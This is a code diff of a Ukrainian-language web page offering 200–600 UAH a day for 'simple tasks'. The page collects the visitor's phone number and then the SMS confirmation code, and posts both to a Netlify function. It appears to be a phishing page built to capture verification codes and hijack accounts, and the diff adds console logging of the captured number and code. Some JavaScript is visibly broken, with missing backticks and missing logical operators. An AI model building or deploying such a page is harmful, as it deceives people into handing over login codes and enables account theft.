@@ -5,19 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Платимо за завдання</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
-
-        :root {
-            --bg-color-start: #1a1a2e;
-            --bg-color-mid: #16213e;
-            --bg-color-end: #0f3460;
-            --card-bg-color: rgba(22, 33, 62, 0.6);
-            --text-color: #e9e9e9;
-            --gradient-start: #ffd700;
-            --gradient-mid: #f0b90b;
-            --gradient-end: #ffec80;
-        }
-
         * {
             box-sizing: border-box;
             margin: 0;
@@ -25,35 +12,26 @@
         }
 
         body {
-            font-family: 'Poppins', sans-serif;
-            color: var(--text-color);
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            background: linear-gradient(45deg, #1a1a2e, #16213e, #0f3460);
+            color: #fff;
             text-align: center;
             padding: 20px;
-            background: linear-gradient(-45deg, var(--bg-color-start), var(--bg-color-mid), var(--bg-color-end));
-            background-size: 400% 400%;
-            animation: backgroundAnimation 15s ease infinite;
-        }
-
-        @keyframes backgroundAnimation {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
         }
 
         .card {
-            width: 100%;
-            max-width: 420px;
-            background: var(--card-bg-color);
-            padding: 40px 30px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 215, 0, 0.2);
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(5px);
+            position: relative;
+            z-index: 1;
         }
 
         .screen {
@@ -62,87 +40,40 @@
 
         .screen.active {
             display: block;
-            animation: fadeIn 0.5s ease-in-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .logo-container {
-            margin-bottom: 25px;
-        }
-
-        .logo-container svg {
-            width: 60px;
-            height: 60px;
-            fill: url(#logoGradient);
         }
 
         h1 {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            background: linear-gradient(90deg, var(--gradient-start), var(--gradient-mid), var(--gradient-end), var(--gradient-start));
-            background-size: 200% auto;
-            color: #fff;
-            background-clip: text;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: textShine 3s linear infinite;
-        }
-
-        @keyframes textShine {
-            to { background-position: 200% center; }
+            font-size: 24px;
+            margin-bottom: 20px;
         }
 
         p {
             font-size: 16px;
-            margin-bottom: 30px;
-            line-height: 1.6;
-            color: #c0c0c0;
-        }
-
-        .main-subtitle {
-            font-weight: 600;
-            font-size: 18px;
-            color: var(--text-color);
+            margin-bottom: 20px;
+            color: #ddd;
         }
 
         .button {
-            display: inline-block;
             width: 100%;
             padding: 15px;
             border: none;
             border-radius: 8px;
-            color: #121212;
+            background: linear-gradient(90deg, #ffd700, #f0b90b);
+            color: #000;
             font-size: 18px;
-            font-weight: 700;
+            font-weight: bold;
             cursor: pointer;
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
-            background: linear-gradient(90deg, var(--gradient-start), var(--gradient-mid));
-            background-size: 200% 200%;
-            animation: buttonShine 3s ease infinite;
-            position: relative;
+            transition: transform 0.2s;
             z-index: 10;
         }
 
-        @keyframes buttonShine {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-.button:hover {
-            transform: translateY(-3px) scale(1.02);
-            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);
+        .button:hover {
+            transform: scale(1.02);
         }
 
         .button:disabled {
             background: #555;
             cursor: not-allowed;
-            animation: none;
         }
 
         .form-group {
@@ -152,62 +83,41 @@
         .phone-input-wrapper {
             display: flex;
             align-items: center;
-            background-color: var(--card-bg-color);
-            border: 2px solid rgba(255, 215, 0, 0.5);
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid #ffd700;
             border-radius: 8px;
-            padding: 0 15px;
-            transition: all 0.3s ease;
-        }
-
-        .phone-input-wrapper:focus-within {
-            border-color: var(--gradient-start);
-            box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
+            padding: 10px;
         }
 
         .phone-prefix {
             font-size: 18px;
-            font-weight: 600;
-            margin-right: 10px;
             color: #aaa;
+            margin-right: 10px;
         }
 
         .input-field {
-            width: 100%;
-            padding: 15px 0;
+            flex: 1;
             border: none;
             background: none;
-            color: var(--text-color);
+            color: #fff;
             font-size: 18px;
-            font-family: 'Poppins', sans-serif;
-            font-weight: 600;
-        }
-
-        .input-field:focus {
             outline: none;
         }
 
         #code-input {
-            letter-spacing: 10px;
-            text-align: center;
-            font-size: 24px;
-            padding: 15px;
             width: 100%;
-            background-color: var(--card-bg-color);
-            border: 2px solid rgba(255, 215, 0, 0.5);
+            padding: 15px;
+            border: 2px solid #ffd700;
             border-radius: 8px;
-            color: var(--text-color);
-            transition: all 0.3s ease;
-        }
-
-        #code-input:focus {
-            outline: none;
-            border-color: var(--gradient-start);
-            box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 18px;
+            text-align: center;
         }
 
         .loader {
             border: 4px solid #333;
-            border-top: 4px solid var(--gradient-start);
+            border-top: 4px solid #ffd700;
             border-radius: 50%;
             width: 30px;
             height: 30px;
@@ -223,32 +133,16 @@
     </style>
 </head>
 <body>
-    <svg width="0" height="0" style="position:absolute;">
-        <defs>
-            <linearGradient id="logoGradient" x1="0%" y1="0%" x2="100%" y2="100%">
-                <stop offset="0%" style="stop-color:var(--gradient-start);stop-opacity:1" />
-                <stop offset="100%" style="stop-color:var(--gradient-mid);stop-opacity:1" />
-            </linearGradient>
-        </defs>
-    </svg>
-
     <div class="card">
-        <div class="logo-container">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                <path d="M20 4H4C2.89543 4 2 4.89543 2 6V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V6C22 4.89543 21.1046 4 20 4ZM20 18H4V6H20V18Z"/>
-                <path d="M20 9H16C15.4477 9 15 9.44772 15 10V14C15 14.5523 15.4477 15 16 15H20V9Z"/>
-            </svg>
-        </div>
-
         <div id="welcome-screen" class="screen active">
-            <h1>Платимо за виконання простих завдань</h1>
-            <p class="main-subtitle">Отримуй від 200 до 600 грн в день</p>
+            <h1>Платимо за завдання</h1>
+            <p>Отримуй від 200 до 600 грн в день!</p>
             <button id="start-btn" class="button">Почати</button>
         </div>
 
         <div id="phone-screen" class="screen">
-            <h1>Авторизуйся щоб почати</h1>
-            <p>Введіть ваш номер телефону для продовження.</p>
+            <h1>Введіть номер телефону</h1>
+            <p>Вкажіть ваш номер для авторизації.</p>
             <div class="form-group">
                 <div class="phone-input-wrapper">
                     <span class="phone-prefix">+380</span>
@@ -259,8 +153,8 @@
         </div>
 
 <div id="code-screen" class="screen">
-            <h1>Очікуйте на смс з кодом</h1>
-            <p>Ми відправили код підтвердження на ваш номер.</p>
+            <h1>Введіть код</h1>
+            <p>Ми відправили код на ваш номер.</p>
             <div class="form-group">
                 <input type="tel" id="code-input" maxlength="6" placeholder="_ _ _ _ _ _">
             </div>
@@ -271,7 +165,8 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('DOM загружен'); // Отладка
+            console.log('Страница загружена'); // Отладка
+
             const welcomeScreen = document.getElementById('welcome-screen');
             const phoneScreen = document.getElementById('phone-screen');
             const codeScreen = document.getElementById('code-screen');
@@ -282,25 +177,26 @@
             const codeInput = document.getElementById('code-input');
             const loader = document.getElementById('loader');
 
-            // Проверка наличия элементов
+            // Проверка элементов
             if (!startBtn  !welcomeScreen  !phoneScreen  !codeScreen  !authBtn  !codeBtn  !phoneInput  !codeInput  !loader) {
-                console.error('Ошибка: один или несколько элементов не найдены');
-                alert('Ошибка загрузки страницы. Попробуйте обновить.');
+                console.error('Ошибка: элементы не найдены', { startBtn, welcomeScreen, phoneScreen, codeScreen, authBtn, codeBtn, phoneInput, codeInput, loader });
+                alert('Ошибка загрузки страницы. Обновите страницу.');
                 return;
             }
 
             // Кнопка "Почати"
             startBtn.addEventListener('click', () => {
-                console.log('Кнопка "Почати" нажата'); // Отладка
+                console.log('Кнопка "Почати" нажата');
                 welcomeScreen.classList.remove('active');
                 phoneScreen.classList.add('active');
             });
 
             // Кнопка "Авторизуватись"
             authBtn.addEventListener('click', async () => {
+                console.log('Кнопка "Авторизуватись" нажата');
                 const rawPhone = phoneInput.value.replace(/\s/g, '');
                 if (rawPhone.length !== 9) {
-                    alert('Введите полный номер телефона.');
+                    alert('Введите полный номер телефона (9 цифр).');
                     return;
                 }
                 const userPhoneNumber = +380${rawPhone};
@@ -312,12 +208,13 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ type: 'phone', data: userPhoneNumber }),
                     });
-                    if (!response.ok) throw new Error(Ошибка HTTP: ${response.status});
+                    if (!response.ok) throw new Error(HTTP ошибка: ${response.status});
+                    console.log('Номер отправлен:', userPhoneNumber);
                     phoneScreen.classList.remove('active');
                     codeScreen.classList.add('active');
                 } catch (error) {
-                    console.error('Ошибка fetch:', error);
-                    alert('Ошибка при отправке номера. Попробуйте снова.');
+                    console.error('Ошибка:', error);
+                    alert('Ошибка отправки номера. Попробуйте снова.');
                 } finally {
                     authBtn.disabled = false;
                     authBtn.textContent = 'Авторизуватись';
@@ -326,32 +223,34 @@
 
             // Кнопка "Подтвердить"
             codeBtn.addEventListener('click', async () => {
+                console.log('Кнопка "Подтвердить" нажата');
                 const code = codeInput.value.replace(/\s/g, '');
                 if (code.length < 4) {
-                    alert('Введите код.');
+                    alert('Введите код (минимум 4 символа).');
                     return;
                 }
                 codeBtn.style.display = 'none';
                 loader.style.display = 'block';
-                try {
+
+try {
                     const response = await fetch('/.netlify/functions/api', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-
-body: JSON.stringify({ type: 'code', data: { phone: userPhoneNumber, code } }),
+                        body: JSON.stringify({ type: 'code', data: { phone: userPhoneNumber, code } }),
                     });
-                    if (!response.ok) throw new Error(Ошибка HTTP: ${response.status});
-                    document.querySelector('.card').innerHTML = '<h1>Дякуємо!</h1><p>Ваші дані успішно відправлено. Ми скоро з вами зв\'яжемося.</p>';
+                    if (!response.ok) throw new Error(HTTP ошибка: ${response.status});
+                    console.log('Код отправлен:', code);
+                    document.querySelector('.card').innerHTML = '<h1>Дякуємо!</h1><p>Ваші дані відправлено.</p>';
                 } catch (error) {
-                    console.error('Ошибка fetch:', error);
-                    alert('Ошибка при отправке кода. Попробуйте снова.');
+                    console.error('Ошибка:', error);
+                    alert('Ошибка отправки кода. Попробуйте снова.');
                 } finally {
                     codeBtn.style.display = 'block';
                     loader.style.display = 'none';
                 }
             });
 
-            // Форматирование ввода телефона
+            // Форматирование номера телефона
             phoneInput.addEventListener('input', (e) => {
                 let value = e.target.value.replace(/\D/g, '');
                 let formatted = '';
